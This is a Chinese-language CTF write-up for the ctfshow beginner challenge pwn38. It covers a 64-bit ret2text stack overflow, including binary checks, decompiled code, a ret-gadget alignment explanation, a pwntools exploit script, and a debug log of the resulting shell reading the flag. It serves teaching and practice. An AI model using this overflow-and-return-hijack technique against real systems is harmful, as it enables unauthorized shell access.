```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn38
```

```
tasike@tasike-VM:~/Desktop$ file pwn38
pwn38: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0e0780c394e8b3d54f54cb54ac8959022f30c4a4, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn38
[*] '/home/tasike/Desktop/pwn38'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

堆栈不可执行

ida查看：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  puts(s);
  puts(asc_400890);
  puts(asc_400910);
  puts(asc_4009A0);
  puts(asc_400A30);
  puts(asc_400AB8);
  puts(asc_400B50);
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Stack_Overflow                                          ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : It has system and '/bin/sh'.There is a backdoor function");
  puts("    * *************************************                           ");
  puts("Just easy ret2text&&64bit");
  ctfshow();
  puts("\nExit");
  return 0;
}
```

跟进`ctfshow`函数

```c
ssize_t ctfshow()
{
  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF

  return read(0, buf, 0x32uLL);
}
```

`buf`与`rbp`的距离为`0xA`，显然这里可以栈溢出

发现后门函数`backdoor`:
```c
__int64 backdoor()
{
  system("/bin/sh\n");
  return 0LL;
}
```

因此，溢出`buf`，覆写返回地址即可。



==下面演示：==

(由于这是64bit的，所以需要考虑堆栈平衡加上`ret`返回地址)

堆栈平衡指的就是payload的字节数是16的倍数，`cyclic(0xA + 0x8)`是18个字节，`p64()`是8个字节，因此如果仅仅`cyclic(0xA + 0x8) + p64(backdoor_addr)`显然只有24字节，不是16的倍数，因此在它们中间加一个`p64(ret)`能够达到堆栈平衡

首先查看`ret`地址(事实上这个`ret`也可以是main的，可以用ida查看`main`的`ret`)

```
tasike@tasike-VM:~/Desktop$ ROPgadget --binary pwn38 --only "ret"
Gadgets information
============================================================
0x0000000000400287 : ret

Unique gadgets found: 1
```

编写`attack38.py`

```python
from pwn import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28205)
ret = 0x400287
backdoor = 0x400657  # 0x400772 
payload = cyclic(0xA + 0x8) + p64(ret) + p64(backdoor)
r.sendline(payload)
r.interactive()
```

运行攻击脚本：

```
tasike@tasike-VM:~/Desktop$ python3 attack38.py
[+] Opening connection to pwn.challenge.ctf.show on port 28205: Done
[DEBUG] Sent 0x23 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 87 02  40 00 00 00  00 00 57 06  40 00 00 00  │ea··│@···│··W·│@···│
    00000020  00 00 0a                                            │···│
    00000023
[*] Switching to interactive mode
[DEBUG] Received 0x557 bytes:
    00000000  20 20 20 20  e2 96 84 e2  96 84 e2 96  84 e2 96 84  │    │····│····│····│
    00000010  20 20 20 e2  96 84 e2 96  84 e2 96 84  e2 96 84 e2  │   ·│····│····│····│
    00000020  96 84 e2 96  84 e2 96 84  e2 96 84 20  20 e2 96 84  │····│····│··· │ ···│
    00000030  e2 96 84 e2  96 84 e2 96  84 e2 96 84  e2 96 84 e2  │····│····│····│····│
    00000040  96 84 e2 96  84 20 20 20  20 20 20 20  20 20 20 20  │····│·   │    │    │
    00000050  20 e2 96 84  e2 96 84 20  20 20 20 20  20 20 20 20  │ ···│··· │    │    │
    00000060  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000070  20 20 0a 20  20 e2 96 88  e2 96 88 e2  96 80 e2 96  │  · │ ···│····│····│
    00000080  80 e2 96 80  e2 96 80 e2  96 88 20 20  e2 96 80 e2  │····│····│··  │····│
    00000090  96 80 e2 96  80 e2 96 88  e2 96 88 e2  96 80 e2 96  │····│····│····│····│
    000000a0  80 e2 96 80  20 20 e2 96  88 e2 96 88  e2 96 80 e2  │····│  ··│····│····│
    000000b0  96 80 e2 96  80 e2 96 80  e2 96 80 e2  96 80 20 20  │····│····│····│··  │
    000000c0  20 20 20 20  20 20 20 20  20 20 e2 96  88 e2 96 88  │    │    │  ··│····│
    000000d0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000000e0  20 20 20 20  20 20 20 20  20 20 20 0a  20 e2 96 88  │    │    │   ·│ ···│
    000000f0  e2 96 88 e2  96 80 20 20  20 20 20 20  20 20 20 20  │····│··  │    │    │
    00000100  e2 96 88 e2  96 88 20 20  20 20 20 e2  96 88 e2 96  │····│··  │   ·│····│
    00000110  88 20 20 20  20 20 20 20  20 e2 96 84  e2 96 84 e2  │·   │    │ ···│····│
    00000120  96 88 e2 96  88 e2 96 88  e2 96 88 e2  96 88 e2 96  │····│····│····│····│
    00000130  84 20 20 e2  96 88 e2 96  88 e2 96 84  e2 96 88 e2  │·  ·│····│····│····│
    00000140  96 88 e2 96  88 e2 96 88  e2 96 84 20  20 20 e2 96  │····│····│··· │  ··│
    00000150  84 e2 96 88  e2 96 88 e2  96 88 e2 96  88 e2 96 84  │····│····│····│····│
    00000160  20 20 e2 96  88 e2 96 88  20 20 20 20  20 20 e2 96  │  ··│····│    │  ··│
    00000170  88 e2 96 88  0a 20 e2 96  88 e2 96 88  20 20 20 20  │····│· ··│····│    │
    00000180  20 20 20 20  20 20 20 e2  96 88 e2 96  88 20 20 20  │    │   ·│····│·   │
    00000190  20 20 e2 96  88 e2 96 88  e2 96 88 e2  96 88 e2 96  │  ··│····│····│····│
    000001a0  88 e2 96 88  e2 96 88 20  20 20 e2 96  88 e2 96 88  │····│··· │  ··│····│
    000001b0  e2 96 84 e2  96 84 e2 96  84 e2 96 84  20 e2 96 80  │····│····│····│ ···│
    000001c0  20 20 e2 96  88 e2 96 88  e2 96 80 20  20 20 e2 96  │  ··│····│··· │  ··│
    000001d0  88 e2 96 88  20 20 e2 96  88 e2 96 88  e2 96 80 20  │····│  ··│····│··· │
    000001e0  20 e2 96 80  e2 96 88 e2  96 88 20 e2  96 80 e2 96  │ ···│····│·· ·│····│
    000001f0  88 20 20 e2  96 88 e2 96  88 20 20 e2  96 88 e2 96  │·  ·│····│·  ·│····│
    00000200  80 0a 20 e2  96 88 e2 96  88 e2 96 84  20 20 20 20  │·· ·│····│····│    │
    00000210  20 20 20 20  20 20 e2 96  88 e2 96 88  20 20 20 20  │    │  ··│····│    │
    00000220  20 e2 96 88  e2 96 88 20  20 20 20 20  20 20 20 20  │ ···│··· │    │    │
    00000230  e2 96 80 e2  96 80 e2 96  80 e2 96 80  e2 96 88 e2  │····│····│····│····│
    00000240  96 88 e2 96  84 20 20 e2  96 88 e2 96  88 20 20 20  │····│·  ·│····│·   │
    00000250  20 e2 96 88  e2 96 88 20  20 e2 96 88  e2 96 88 20  │ ···│··· │ ···│··· │
    00000260  20 20 20 e2  96 88 e2 96  88 20 20 e2  96 88 e2 96  │   ·│····│·  ·│····│
    00000270  88 e2 96 84  e2 96 88 e2  96 88 e2 96  84 e2 96 88  │····│····│····│····│
    00000280  e2 96 88 20  0a 20 20 e2  96 88 e2 96  88 e2 96 84  │··· │·  ·│····│····│
    00000290  e2 96 84 e2  96 84 e2 96  84 e2 96 88  20 20 20 20  │····│····│····│    │
    000002a0  20 e2 96 88  e2 96 88 20  20 20 20 20  e2 96 88 e2  │ ···│··· │    │····│
    000002b0  96 88 20 20  20 20 20 20  20 20 e2 96  88 e2 96 84  │··  │    │  ··│····│
    000002c0  e2 96 84 e2  96 84 e2 96  84 e2 96 84  e2 96 88 e2  │····│····│····│····│
    000002d0  96 88 20 20  e2 96 88 e2  96 88 20 20  20 20 e2 96  │··  │····│··  │  ··│
    000002e0  88 e2 96 88  20 20 e2 96  80 e2 96 88  e2 96 88 e2  │····│  ··│····│····│
    000002f0  96 84 e2 96  84 e2 96 88  e2 96 88 e2  96 80 20 20  │····│····│····│··  │
    00000300  e2 96 80 e2  96 88 e2 96  88 20 20 e2  96 88 e2 96  │····│····│·  ·│····│
    00000310  88 e2 96 80  20 0a 20 20  20 20 e2 96  80 e2 96 80  │····│ ·  │  ··│····│
    00000320  e2 96 80 e2  96 80 20 20  20 20 20 20  e2 96 80 e2  │····│··  │    │····│
    00000330  96 80 20 20  20 20 20 e2  96 80 e2 96  80 20 20 20  │··  │   ·│····│·   │
    00000340  20 20 20 20  20 20 e2 96  80 e2 96 80  e2 96 80 e2  │    │  ··│····│····│
    00000350  96 80 e2 96  80 e2 96 80  20 20 20 e2  96 80 e2 96  │····│····│   ·│····│
    00000360  80 20 20 20  20 e2 96 80  e2 96 80 20  20 20 20 e2  │·   │ ···│··· │   ·│
    00000370  96 80 e2 96  80 e2 96 80  e2 96 80 20  20 20 20 20  │····│····│··· │    │
    00000380  e2 96 80 e2  96 80 20 20  e2 96 80 e2  96 80 20 20  │····│··  │····│··  │
    00000390  0a 20 20 20  20 2a 20 2a  2a 2a 2a 2a  2a 2a 2a 2a  │·   │ * *│****│****│
    000003a0  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  │****│****│****│****│
    000003b0  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  20 20 20 20  │****│****│****│    │
    000003c0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000003d0  20 20 20 20  20 20 20 0a  20 20 20 20  2a 20 43 6c  │    │   ·│    │* Cl│
    000003e0  61 73 73 69  66 79 3a 20  43 54 46 73  68 6f 77 20  │assi│fy: │CTFs│how │
    000003f0  2d 2d 2d 20  50 57 4e 20  2d 2d 2d 20  e5 85 a5 e9  │--- │PWN │--- │····│
    00000400  97 a8 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │··  │    │    │    │
    00000410  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000420  0a 20 20 20  20 2a 20 54  79 70 65 20  20 3a 20 53  │·   │ * T│ype │ : S│
    00000430  74 61 63 6b  5f 4f 76 65  72 66 6c 6f  77 20 20 20  │tack│_Ove│rflo│w   │
    00000440  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000460  20 20 20 20  20 20 20 0a  20 20 20 20  2a 20 53 69  │    │   ·│    │* Si│
    00000470  74 65 20 20  3a 20 68 74  74 70 73 3a  2f 2f 63 74  │te  │: ht│tps:│//ct│
    00000480  66 2e 73 68  6f 77 2f 20  20 20 20 20  20 20 20 20  │f.sh│ow/ │    │    │
    00000490  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000004a0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 0a 20  │    │    │    │  · │
    000004b0  20 20 20 2a  20 48 69 6e  74 20 20 3a  20 49 74 20  │   *│ Hin│t  :│ It │
    000004c0  68 61 73 20  73 79 73 74  65 6d 20 61  6e 64 20 27  │has │syst│em a│nd '│
    000004d0  2f 62 69 6e  2f 73 68 27  2e 54 68 65  72 65 20 69  │/bin│/sh'│.The│re i│
    000004e0  73 20 61 20  62 61 63 6b  64 6f 6f 72  20 66 75 6e  │s a │back│door│ fun│
    000004f0  63 74 69 6f  6e 0a 20 20  20 20 2a 20  2a 2a 2a 2a  │ctio│n·  │  * │****│
    00000500  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  │****│****│****│****│
    *
    00000520  2a 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │*   │    │    │    │
    00000530  20 20 20 20  20 20 20 20  20 20 20 20  0a 4a 75 73  │    │    │    │·Jus│
    00000540  74 20 65 61  73 79 20 72  65 74 32 74  65 78 74 26  │t ea│sy r│et2t│ext&│
    00000550  26 36 34 62  69 74 0a                               │&64b│it·│
    00000557
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Stack_Overflow                                          
    * Site  : https://ctf.show/                                       
    * Hint  : It has system and '/bin/sh'.There is a backdoor function
    * *************************************                           
Just easy ret2text&&64bit
$ la
[DEBUG] Sent 0x3 bytes:
    b'la\n'
[DEBUG] Received 0x1a bytes:
    b'/bin/sh: 1: la: not found\n'
/bin/sh: 1: la: not found
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x75 bytes:
    b'bin\n'
    b'boot\n'
    b'ctfshow_flag\n'
    b'dev\n'
    b'etc\n'
    b'home\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'media\n'
    b'mnt\n'
    b'opt\n'
    b'proc\n'
    b'pwn\n'
    b'root\n'
    b'run\n'
    b'sbin\n'
    b'srv\n'
    b'start.sh\n'
    b'sys\n'
    b'tmp\n'
    b'usr\n'
    b'var\n'
bin
boot
ctfshow_flag
dev
etc
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
start.sh
sys
tmp
usr
var
$ cat stfshow_flag
[DEBUG] Sent 0x11 bytes:
    b'cat stfshow_flag\n'
[DEBUG] Received 0x2d bytes:
    b'cat: stfshow_flag: No such file or directory\n'
cat: stfshow_flag: No such file or directory
$ cat ctfshow_flag
[DEBUG] Sent 0x11 bytes:
    b'cat ctfshow_flag\n'
[DEBUG] Received 0x2e bytes:
    b'ctfshow{fef9e0de-35d0-4a04-987a-04f883b7a866}\n'
ctfshow{fef9e0de-35d0-4a04-987a-04f883b7a866}
$ 
```

